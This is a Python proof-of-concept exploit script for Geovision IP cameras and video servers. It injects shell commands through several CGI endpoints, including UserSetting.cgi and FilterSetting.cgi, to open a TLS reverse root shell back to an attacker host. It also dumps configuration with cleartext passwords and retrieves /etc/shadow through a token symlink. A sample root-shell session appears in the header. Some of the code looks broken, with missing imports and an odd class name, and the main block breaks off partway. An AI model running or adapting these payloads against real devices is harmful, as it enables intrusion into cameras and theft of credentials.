#!/usr/bin/env python2.7
#
# [SOF]
#
# Geovision Inc. IP Camera & Video Server Remote Command Execution PoC
# Researcher: bashis <mcw noemail eu> (November 2017)
#
###########################################################################################
#
# 1. Pop stunnel TLSv1 reverse root shell [Local listener: 'ncat -vlp <LPORT> --ssl'; Verified w/ v7.60]
# 2. Dump all settings of remote IPC with Login/Passwd in cleartext
# Using:
# - CGI: 'Usersetting.cgi' (Logged in user) < v3.12 (Very old) [Used as default]
# - CGI: 'FilterSetting.cgi' (Logged in user) < v3.12 (Very old)
# - CGI: 'PictureCatch.cgi' (Anonymous) > v3.10
# - CGI: 'JpegStream.cgi' (Anonymous) > v3.10
# 3. GeoToken PoC to login and download /etc/shadow via generated token symlink
#
# Sample reverse shell:
# $ ncat -vlp 1337 --ssl
# Ncat: Version 7.60 ( https://nmap.org/ncat )
# Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
# Ncat: SHA-1 fingerprint: 3469 C118 43F0 043A 5168 189B 1D67 1131 4B5B 1603
# Ncat: Listening on :::1337
# Ncat: Listening on 0.0.0.0:1337
# Ncat: Connection from 192.168.57.20.
# Ncat: Connection from 192.168.57.20:16945.
# /bin/sh: can't access tty; job control turned off
# /www # id
# id
# uid=0(root) gid=0(root)
# /www # uname -a
# uname -a
# Linux IPCAM 2.6.18_pro500-davinci #1 Mon Jun 19 21:27:10 CST 2017 armv5tejl unknown
# /www # exit
# $

############################################################################################

from __future__ import print_function
import sys
import socket
import urllib, urllib2, httplib
import json
import hashlib
import commentjson # pip install commentjson
import xmltodict # pip install xmltodict
import select
import string
import argparse
import random
import base64
import ssl
import json
import os
import re

#from pwn import *

def split2len(s, n):
	def _f(s, n):
		while s:
			yield s[:n]
			s = s[n:]
	return list(_f(s, n))

# Ignore download of '302 Found/Location' redirections
class NoRedirection(urllib2.HTTPErrorProcessor):

	def http_response(self, request, response):
		return response
	https_response = http_response

class HTTPconnect:

	def __init__(self, host, proto, verbose, credentials, Raw, noexploit):
		self.host = host
		self.proto = proto
		self.verbose = verbose
		self.credentials = credentials
		self.Raw = Raw
		self.noexploit = False
		self.noexploit = noexploit
	
	def Send(self, uri, query_headers, query_data, ID):
		self.uri = uri
		self.query_headers = query_headers
		self.query_data = query_data
		self.ID = ID

		# Connect-timeout in seconds
		timeout = 10
		socket.setdefaulttimeout(timeout)

		url = '{}://{}{}'.format(self.proto, self.host, self.uri)

		if self.verbose:
			print("[Verbose] Sending:", url)

		if self.proto == 'https':
			if hasattr(ssl, '_create_unverified_context'):
				print("[i] Creating SSL Unverified Context")
				ssl._create_default_https_context = ssl._create_unverified_context

		if self.credentials:
			Basic_Auth = self.credentials.split(':')
			if self.verbose:
				print("[Verbose] User:",Basic_Auth[0],"password:",Basic_Auth[1])
			try:
				pwd_mgr = urllib2.HTTPpasswordMgrWithDefaultDahua_realm()
				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
				auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
				if verbose:
					http_logger = urllib2.HTTPHandler(debuglevel = 1) # HTTPSHandler... for HTTPS
					opener = urllib2.build_opener(auth_handler,NoRedirection,http_logger)
				else:
					opener = urllib2.build_opener(auth_handler,NoRedirection)
				urllib2.install_opener(opener)
			except Exception as e:
				print("[!] Basic Auth Error:",e)
				sys.exit(1)
		else:
			# Don't follow redirects!
			if verbose:
				http_logger = urllib2.HTTPHandler(debuglevel = 1)
				opener = urllib2.build_opener(http_logger,NoRedirection)
				urllib2.install_opener(opener)
			else:
				NoRedir = urllib2.build_opener(NoRedirection)
				urllib2.install_opener(NoRedir)


		if self.noexploit and not self.verbose:
			print("[<] 204 Not Sending!")
			html =  "Not sending any data"
			return html
		else:
			if self.query_data:
				req = urllib2.Request(url, data=urllib.urlencode(self.query_data,doseq=True), headers=self.query_headers)
				if self.ID:
					Cookie = 'CLIENT_ID={}'.format(self.ID)
					req.add_header('Cookie', Cookie)
			else:
				req = urllib2.Request(url, None, headers=self.query_headers)
				if self.ID:
					Cookie = 'CLIENT_ID={}'.format(self.ID)
					req.add_header('Cookie', Cookie)
			rsp = urllib2.urlopen(req)
			if rsp:
				print("[<] {}".format(rsp.code))

		if self.Raw:
			return rsp
		else:
			html = rsp.read()
			return html



#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
			i = int(tmp)
			if i < 0 or i > 255:
				return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid DNS name, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False



class Geovision:

	def __init__(self, rhost, proto, verbose, credentials, raw_request, noexploit, headers, SessionID):
		self.rhost = rhost
		self.proto = proto
		self.verbose = verbose
		self.credentials = credentials
		self.raw_request = raw_request
		self.noexploit = noexploit
		self.headers = headers
		self.SessionID = SessionID


	def Login(self):

		try:

			print("[>] Requesting keys from remote")
			URI = '/ssi.cgi/Login.htm'
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,None,None)
			response = response.read()[:1500]
			response = re.split('[()<>?"\n_&;/ ]',response)
	#		print response

		except Exception as e:
			print("[!] Can't access remote host... ({})".format(e))
			sys.exit(1)

		try:
			#
			# Geovision way to have MD5 random Login and Password
			#
			CC1 = ''
			CC2 = ''
			for check in range(0,len(response)):
				if response[check] == 'cc1=':
					CC1 = response[check+1]
					print("[i] Random key CC1: {}".format(response[check+1]))
				elif response[check] == 'cc2=':
					CC2 = response[check+1]
					print("[i] Random key CC2: {}".format(response[check+1]))
				"""
				#
				# Less interesting to know, but leave it here anyway.
				#
				# If the remote server has enabled guest view, these below will not be '0'
				elif response[check] == 'GuestIdentify':
					print "[i] GuestIdentify: {}".format(response[check+2])
				elif response[check] == 'uid':
					if response[check+2]:
						print "[i] uid: {}".format(response[check+2])
					else:
						print "[i] uid: {}".format(response[check+3])
				elif response[check] == 'pid':
					if response[check+2]:
						print "[i] pid: {}".format(response[check+2])
					else:
						print "[i] pid: {}".format(response[check+3])
				"""

			if not CC1 and not CC2:
				print("[!] CC1 and CC2 missing!")
				print("[!] Cannot generate MD5, exiting..")
				sys.exit(0)

			#
			# Geovision MD5 Format
			#
			uMD5 = hashlib.md5(CC1 + username + CC2).hexdigest().upper()
			pMD5 = hashlib.md5(CC2 + password + CC1).hexdigest().upper()
	#		print "[i] User MD5: {}".format(uMD5)
	#		print "[i] Pass MD5: {}".format(pMD5)


			self.query_args = {
				"username":"",
				"password":"",
				"Apply":"Apply",
				"umd5":uMD5,
				"pmd5":pMD5,
				"browser":1,
				"is_check_OCX_OK":0
				}

			print("[>] Logging in")
			URI = '/LoginPC.cgi'
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
	#		print response.info()

			# if we don't get 'Set-Cookie' back from the server, the Login has failed
			if not (response.info().get('Set-Cookie')):
				print("[!] Login Failed!")
				sys.exit(1)
			if verbose:
				print("Cookie: {}".format(response.info().get('Set-Cookie')))

			return response.info().get('Set-Cookie')

		except Exception as e:
			print("[i] What happen? ({})".format(e))
			exit(0)


	def DeviceInfo(self):

		try:
			URI = '/PSIA/System/deviceInfo'
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,None)
			deviceinfo = xmltodict.parse(response)
			print("[i] Remote target: {} ({})".format(deviceinfo['DeviceInfo']['model'],deviceinfo['DeviceInfo']['firmwareVersion']))
			return True

		except Exception as e:
			print("[i] Info about remote target failed ({})".format(e))
			return False


	def UserSetting(self,DumpSettings):
		self.DumpSettings = DumpSettings

		if self.DumpSettings:
			print("[i] Dump Config of remote")
			SH_CMD = '`echo "<!--#include file="SYS_CFG"-->" >/var/www/tmp/Login.htm`'
		else:

			print("[i] Launching TLSv1 privacy reverse shell")
			self.headers = {
				'Connection': 'close',
				'Accept-Language'	:	'en-US,en;q=0.8',
				'Cache-Control'	:	'max-age=0',
				'User-Agent':'Mozilla',
				'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
				}
			SH_CMD = ';echo -en \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
			SH_CMD = SH_CMD.replace("LHOST",lhost)
			SH_CMD = SH_CMD.replace("LPORT",lport)

		print("[>] Pwning Usersetting.cgi")
		self.query_args = {
			"umd5":SH_CMD,
			"pmd5":"GEOVISION",
			"nmd5":"PWNED",
			"cnt5":"",
			"username":"",
			"passwordOld":"",
			"passwordNew":"",
			"passwordRetype":"",
			"btnSubmitAdmin":"1",
			"submit":"Apply"
			}
		try:
			URI = '/UserSetting.cgi'
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
			if DumpSettings:
				print("[i] Dumping")
				URI = '/ssi.cgi/tmp/Login.htm'
				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
				print(response)
				return True

		except Exception as e:
			if str(e) == "timed out" or str(e) == "('The read operation timed out',)":
				print("[!] Enjoy the shell... ({})".format(e))
				return True


	def PictureCatch(self,DumpSettings):
		self.DumpSettings = DumpSettings

		if self.DumpSettings:
			print("[i] Dump Config of remote")
			SH_CMD = '`echo "<!--#include file="SYS_CFG"-->" >/var/www/tmp/Login.htm`'
		else:

			print("[i] Launching TLSv1 privacy reverse shell")
			self.headers = {
				'Connection': 'close',
				'Accept-Language'	:	'en-US,en;q=0.8',
				'Cache-Control'	:	'max-age=0',
				'User-Agent':'Mozilla',
				'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
				}
			SH_CMD = ';echo -en \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
			SH_CMD = SH_CMD.replace("LHOST",lhost)
			SH_CMD = SH_CMD.replace("LPORT",lport)

		print("[>] Pwning PictureCatch.cgi")
		self.query_args = {
			"username":SH_CMD,
			"password":"GEOVISION",
			"attachment":"1",
			"channel":"1",
			"secret":"1",
			"key":"PWNED"
			}

		try:
			URI = '/PictureCatch.cgi'
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
			if DumpSettings:
				print("[i] Dumping")
				URI = '/ssi.cgi/tmp/Login.htm'
				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
				print(response)
				return True
		except Exception as e:
			if str(e) == "timed out" or str(e) == "('The read operation timed out',)":
				print("[!] Enjoy the shell... ({})".format(e))
				return True


	def JpegStream(self,DumpSettings):
		self.DumpSettings = DumpSettings

		if self.DumpSettings:
			print("[i] Dump Config of remote")
			SH_CMD = '`echo "<!--#include file="SYS_CFG"-->" >/var/www/tmp/Login.htm`'
		else:

			print("[i] Launching TLSv1 privacy reverse shell")
			self.headers = {
				'Connection': 'close',
				'Accept-Language'	:	'en-US,en;q=0.8',
				'Cache-Control'	:	'max-age=0',
				'User-Agent':'Mozilla',
				'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
				}
			SH_CMD = ';echo -en \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
			SH_CMD = SH_CMD.replace("LHOST",lhost)
			SH_CMD = SH_CMD.replace("LPORT",lport)

		print("[>] Pwning JpegStream.cgi")
		self.query_args = {
			"username":SH_CMD,
			"password":"GEOVISION",
			"attachment":"1",
			"channel":"1",
			"secret":"1",
			"key":"PWNED"
			}

		try:
			URI = '/JpegStream.cgi'
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
			if DumpSettings:
				print("[i] Dumping")
				URI = '/ssi.cgi/tmp/Login.htm'
				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
				print(response)
				return True
		except Exception as e:
			if str(e) == "timed out" or str(e) == "('The read operation timed out',)":
				print("[!] Enjoy the shell... ({})".format(e))
				return True

#
# Interesting example of bad code and insufficent sanitation of user input.
# ';' is filtered in v3.12, and when found in the packet, the packet is simply ignored.
#
# Later in the chain the Geovision code will write provided userinput to flash, we may overwrite unwanted flash area if we playing to much here.
# So, we are limited to 31 char per line (32 MUST BE NULL), to play safe game with this bug.
#
# v3.10->3.12 changed how to handle ipfilter
# From:
# User input to system() call in FilterSetting.cgi to set iptable rules and then save them in flash
# To:
# User input transferred from 'FilterSetting.cgi' to flash (/dev/mtd11), and when the tickbox to activate the filter rules,
# '/usr/local/bin/geobox-iptables-reload' is triggered to read these rules from flash and '/usr/local/bin/iptables' via 'geo_net_filter_table_add'
# with system() call in 'libgeo_net.so'
# 

# Should end up into;
# 23835 root        576 S   sh -c /usr/local/bin/iptables -A INPUT  -s `/usr/loca...[trunkated]
# 23836 root       2428 S   /usr/local/bin/stunnel /tmp/x
# 23837 root        824 S   /bin/sh


	def FilterSetting(self):

		try:
			print("[>] Pwning FilterSetting.cgi")
			#
			# ';' will be treated by the code as LF
			# 
			# Let's use some TLSv1 privacy for the reverse shell 
			#
			SH_CMD = 'client=yes;connect=LHOST:LPORT;exec=/bin/sh;pty=yes;sslVersion=TLSv1'
			#
			SH_CMD = SH_CMD.replace("LHOST",lhost)
			SH_CMD = SH_CMD.replace("LPORT",lport)
			ShDict = SH_CMD.split(';')

			MAX_SIZE = 31 # Max Size of the strings to generate
			LF = 0
			LINE = 0
			CMD = {}
			CMD_NO_LF = "`echo -n \"TMP\">>/tmp/x`"
			CMD_DO_LF = "`echo \"TMP\">>/tmp/x`"
			SIZE = MAX_SIZE-(len(CMD_NO_LF)-3) # Size of availible space for our input in 'SH_CMD'

			# Remove, just in case
			CMD[LINE] = "`rm -f /tmp/x`"

			URI = '/FilterSetting.cgi'
			#
			# This loop will make the correct aligment of user input
			#
			for cmd in range(0,len(ShDict)):
				CMD_LF = math.ceil(float(len(ShDict[cmd])) / SIZE)
				cmd_split = split2len(ShDict[cmd], SIZE)
				for CMD_LEN in range(0,len(cmd_split)):
					LINE += 1
					LF += 1
					if (len(cmd_split[CMD_LEN]) > SIZE-1) and (CMD_LF != LF):
						CMD[LINE] = CMD_NO_LF.replace("TMP",cmd_split[CMD_LEN])
					else:
						CMD[LINE] = CMD_DO_LF.replace("TMP",cmd_split[CMD_LEN])
						LF = 0
					if verbose:
						print("Len: {} {}".format(len(CMD[LINE]),CMD[LINE]))

			# Add two more commands to execute stunnel and remove /tmp/x
			CMD[LINE+1] = "`/usr/local/bin/stunnel /tmp/x`" # 31 char, no /usr/local/bin in $PATH
			CMD[LINE+2] = "`rm -f /tmp/x`" # Some bug here, think it is timing as below working
			CMD[LINE+3] = "`rm -f /tmp/x`" # Working, this is only one more add/enable/disable/remove loop
#
# Below while() loop will create following /tmp/x, execute 'stunnel' and remove /tmp/x
#
# client=yes
# connect=<LHOST>:<LPORT>
# exec=/bin/sh
# pty=yes
# sslVersion=TLSv1
#

			NEW_IP_FILTER = 1 # > v3.12
			CMD_LEN = 0
			who = 0
			# Clean up to make room, just in case
			for Remove in range(0,4):
				print("[>] Cleaning ipfilter entry: {}".format(Remove+1))
				self.query_args = {
					"bPolicy":"0",		# 1 = Enable, 0 = Disable
					"Delete":"Remove",	# Remove entry
					"szIpAddr":"",
					"byOpId":"0",		# 0 = Allow, 1 = Deny
					"dwSelIndex":"0",
					}
				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)

			while True:
				if who == len(CMD):
					break
				if CMD_LEN < 4:

					print("[>] Sending: {} ({})".format(CMD[who],len(CMD[who])))
					self.query_args = {
						"szIpAddr":CMD[who], # 31 char limit
						"byOpId":"0", # 0 = Allow, 1 = Deny
						"dwSelIndex":"0", # Seems not to be in use
						"Add":"Apply"
						}
					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
					response = re.split('[()<>?"\n_&;/ ]',response)
					print(response)
					if NEW_IP_FILTER:
						for cnt in range(0,len(response)):
							if response[cnt] == 'iptables':
								NEW_IP_FILTER = 0
								print("[i] Remote don't need Enable/Disable")
								break
					CMD_LEN += 1
					who += 1
					time.sleep(2) # Seems to be too fast without
				# NEW Way
				elif NEW_IP_FILTER:
					print("[>] Enabling ipfilter")
					self.query_args = {
						"bPolicy":"1", # 1 = Enable, 0 = Disable
						"szIpAddr":"",
						"byOpId":"0", # 0 = Allow, 1 = Deny
						"dwSelIndex":"0",
						}

					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)

					print("[i] Sleeping...")
					time.sleep(5)

					print("[>] Disabling ipfilter")
					self.query_args = {
						"szIpAddr":"",
						"byOpId":"0",
						"dwSelIndex":"0",
						}
					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)

					for Remove in range(0,4):
						print("[>] Deleting ipfilter Entry: {}".format(Remove+1))
						self.query_args = {
							"bPolicy":"0", # 1 = Enable, 0 = Disable
							"Delete":"Remove",
							"szIpAddr":"",
							"byOpId":"0",
							"dwSelIndex":"0",
							}
						response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
					CMD_LEN = 0
				# OLD Way
				else:
					for Remove in range(0,4):
						print("[>] Deleting ipfilter Entry: {}".format(Remove+1))
						self.query_args = {
							"bPolicy":"0", # 1 = Enable, 0 = Disable
							"Delete":"Remove",
							"szIpAddr":"",
							"byOpId":"0",
							"dwSelIndex":"0",
							}
						response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
					CMD_LEN = 0

			if NEW_IP_FILTER:
				print("[i] Last sending")
				print("[>] Enabling ipfilter")
				self.query_args = {
					"bPolicy":"1", # 1 = Enable, 0 = Disable
					"szIpAddr":"",
					"byOpId":"0", # 0 = Allow, 1 = Deny
					"dwSelIndex":"0",
					}

				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)

				print("[i] Sleeping...")
				time.sleep(5)

				print("[>] Disabling ipfilter")
				self.query_args = {
					"szIpAddr":"",
					"byOpId":"0",
					"dwSelIndex":"0",
					}
				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)

				for Remove in range(0,4):
					print("[>] Deleting ipfilter Entry: {}".format(Remove+1))
					self.query_args = {
						"bPolicy":"0", # 1 = Enable, 0 = Disable
						"Delete":"Remove",
						"szIpAddr":"",
						"byOpId":"0",
						"dwSelIndex":"0",
						}
					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
			
			print("[!] Enjoy the shell... ")

			return True

		except Exception as e:

			if not NEW_IP_FILTER:
				print("[i] Last sending")
				for Remove in range(0,4):
					print("[>] Deleting ipfilter Entry: {}".format(Remove+1))
					self.query_args = {
						"bPolicy":"0", # 1 = Enable, 0 = Disable
						"Delete":"Remove",
						"szIpAddr":"",
						"byOpId":"0",
						"dwSelIndex":"0",
						}
					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
				print("[!] Enjoy the shell... ")
				return True

			print("[!] Hmm... {}".format(e))
			print(response.read())
			return True


	def GeoToken(self):

		print("[i] GeoToken PoC to login and download /etc/shadow via token symlink")
		print("[!] You must have valid login and password to generate the symlink")
		try:

#########################################################################################
# This is how to list remote *.wav and *.avi files in /storage.

			"""
			print "[>] Requesting token1"
			URI = '/BKCmdToken.php'
			response = HTTPconnect(rhost,proto,verbose,credentials,raw_request,noexploit).Send(URI,headers,None,None)
			result = json.load(response)
			if verbose:
				print json.dumps(result,sort_keys=True,indent=4, separators=(',', ': '))

			print "[i] Request OK?: {}".format(result['success'])
			if not result['success']:
				sys.exit(1)
			token1 = result['token']

#
# SAMPLE OUTPUT
#
#{
#    "success": true,
#    "token": "6fe1a7c1f34431acc7eaecba646b7caf"
#}
#
			# Generate correct MD5 token2
			token2 = hashlib.md5(hashlib.md5(token1 + 'gEo').hexdigest() + 'vIsIon').hexdigest()
			query_args = {
				"token1":token1,
				"token2":token2
				}

			print "[>] List files"
			URI = '/BKFileList.php'
			response = HTTPconnect(rhost,proto,verbose,credentials,raw_request,noexploit).Send(URI,headers,query_args,None)
			result = json.load(response)
			if verbose:
				print json.dumps(result,sort_keys=True,indent=4, separators=(',', ': '))

			for who in result.keys():
				print len(who)
#
# SAMPLE OUTPUT
#
#{
#    "files": [
#        {
#            "file_size": "2904170",
#            "filename": "event20171105104946001.avi",
#            "remote_path": "/storage/hd11-1/GV-MFD1501-0a99a9/cam01/2017/11/05"
#        },
#        {}
#    ]
#}
#########################################################################################
			"""

			# Request remote MD5 token1
			print("[>] Requesting token1")
			URI = '/BKCmdToken.php'
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,None,None)
			result = json.load(response)
			if verbose:
				print(json.dumps(result,sort_keys=True,indent=4, separators=(',', ': ')))

			print("[i] Request OK?: {}".format(result['success']))
			if not result['success']:
				return False
			token1 = result['token']
#
# SAMPLE OUTPUT 
#{
#    "success": true,
#    "token": "6fe1a7c1f34431acc7eaecba646b7caf"
#}
#
			#
			# Generate correct MD5 token2
			#
			# MD5 Format: <login>:<token1>:<password>
			#
			token2 = hashlib.md5(username + ':' + token1 + ':' + password).hexdigest() 

			#
			# symlink this file for us
			#
			filename = '/etc/shadow'

			self.query_args = {
				"token1":token1,
				"token2":token2,
				"filename":filename
				}

			print("[>] Requesting download file link")
			URI = '/BKDownloadLink.cgi'
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,None)
			response = response.read()#[:900]
			response = response.replace("'", "\"")
			result = json.loads(response)
			print("[i] Request OK?: {}".format(result['success']))
			if not result['success']:
				return False
			if verbose:
				print(json.dumps(result,sort_keys=True,indent=4, separators=(',', ': ')))


#
# SAMPLE OUTPUT
#
#{
#    "dl_folder": "/tmp",
#    "dl_token": "C71689493825787.dltoken",
#    "err_code": 0,
#    "success": true
#}
#

			URI = '/ssi.cgi' + result['dl_folder'] + '/' + result['dl_token']

			print("[>] downloading ({}) with ({})".format(filename,URI))
			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,None)
			response = response.read()
			print(response)
			return True

		except Exception as e:
			print("[i] GEO Token fail ({})".format(e))
			return False


if __name__ == '__main__':

#
# Help, info and pre-defined values
#	
	INFO =  '[Geovision Inc. IPC/IPV RCE PoCs (2017 bashis <mcw noemail eu>)]\n'
	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	noexploit = False
	raw_request = True
	rhost = '192.168.57.20'	# Default Remote HOST
	rport = '80'			# Default Remote PORT
	lhost = '192.168.57.1'	# Default Local HOST
	lport = '1337'		# Default Local PORT
#	creds = 'root:pass'
	credentials = False

#
# Geovision stuff
#
	SessionID =  str(int(random.random() * 100000))
	DumpSettings = False
	deviceinfo = False
	GEOtoken = False
	anonymous = False
	filtersetting = False
	usersetting = False
	jpegstream = False
	picturecatch = False
	# Geovision default
	username = 'admin'
	password = 'admin'

#  
# Try to parse all arguments
#
	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=True, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
		arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
		arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
		arg_parser.add_argument('--autoip', required=False, default=False, action='store_true', help='Detect External Connect Back IP [Default: False]')

		arg_parser.add_argument('--deviceinfo', required=False, default=False, action='store_true', help='Request model and firmware version')

		arg_parser.add_argument('-g','--geotoken', required=False, default=False, action='store_true', help='Try retrieve /etc/shadow with geotoken')
		arg_parser.add_argument('-a','--anonymous', required=False, default=False, action='store_true', help='Try pwning as anonymous')
		arg_parser.add_argument('-f','--filtersetting', required=False, default=False, action='store_true', help='Try pwning with FilterSetting.cgi')
		arg_parser.add_argument('-p','--picturecatch', required=False, default=False, action='store_true', help='Try pwning with PictureCatch.cgi')
		arg_parser.add_argument('-j','--jpegstream', required=False, default=False, action='store_true', help='Try pwning with JpegStream.cgi')
		arg_parser.add_argument('-u','--usersetting', required=False, default=False, action='store_true', help='Try pwning with UserSetting.cgi')
		arg_parser.add_argument('-d','--dump', required=False, default=False, action='store_true', help='Try pwning remote config')


		arg_parser.add_argument('--username', required=False, help='Username [Default: '+ username +']')
		arg_parser.add_argument('--password', required=False, help='password [Default: '+ password +']')
		if credentials:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ credentials + ']')
		arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
		arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print(INFO,"\nError: {}\n".format(str(e)))
		sys.exit(1)

	print("\n[*]",INFO)

	if args.verbose:
		verbose = args.verbose
#
# Check validity, update if needed, of provided options
#
	if args.https:
		proto = HTTPS
		if not args.rport:
			rport = '443'

	if credentials and args.auth:
		credentials = args.auth

	if args.geotoken:
		GEOtoken = args.geotoken

	if args.anonymous:
		anonymous = True

	if args.deviceinfo:
		deviceinfo = True

	if args.dump:
		DumpSettings = True

	if args.filtersetting:
		FilterSetting = True

	if args.usersetting:
		usersetting = True

	if args.jpegstream:
		jpegstream = True

	if args.picturecatch:
		picturecatch = True

	if args.username:
		username = args.username

	if args.password:
		password = args.password

	if args.noexploit:
		noexploit = args.noexploit

	if args.rport:
		rport = args.rport

	if args.rhost:
		rhost = args.rhost
		IP = args.rhost

	if args.lport:
		lport = args.lport

	if args.lhost:
		lhost = args.lhost
	elif args.autoip:
		# HTTP check of our external IP
		try:

			headers = {
				'Connection': 'close',
				'Accept'	:	'gzip, deflate',
				'Accept-Language'	:	'en-US,en;q=0.8',
				'Cache-Control'	:	'max-age=0',
				'User-Agent':'Mozilla'
				}

			print("[>] Trying to find out my external IP")
			lhost = HTTPconnect("whatismyip.akamai.com",proto,verbose,credentials,False,noexploit).Send("/",headers,None,None)
			if verbose:
				print("[Verbose] Detected my external IP:",lhost)
		except Exception as e:
			print("[<] ",e)
			sys.exit(1)

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		print("[!] Invalid RPORT - Choose between 1 and 65535")
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print("[!] Invalid RHOST")
		sys.exit(1)

	# Check if LHOST is valid IP or FQDN, get IP back
	lhost = Validate(verbose).Host(lhost)
	if not lhost:
		print("[!] Invalid LHOST")
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print("[!] Invalid RHOST")
		sys.exit(1)


#
# Validation done, start print out stuff to the user
#
	if args.https:
		print("[i] HTTPS / SSL Mode Selected")
	print("[i] Remote target IP:",rhost)
	print("[i] Remote target PORT:",rport)
	if not args.geotoken and not args.dump and not args.deviceinfo:
		print("[i] Connect back IP:",lhost)
		print("[i] Connect back PORT:",lport)

	rhost = rhost + ':' + rport


	headers = {
		'Connection': 'close',
		'Content-Type'	:	'application/x-www-form-urlencoded',
		'Accept'	:	'gzip, deflate',
		'Accept-Language'	:	'en-US,en;q=0.8',
		'Cache-Control'	:	'max-age=0',
		'User-Agent':'Mozilla'
		}

	# Print Model and Firmware version
	Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).DeviceInfo()
	if deviceinfo:
		sys.exit(0)


	# Geovision token login within the function
	#
	if GEOtoken:
		Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).DeviceInfo()
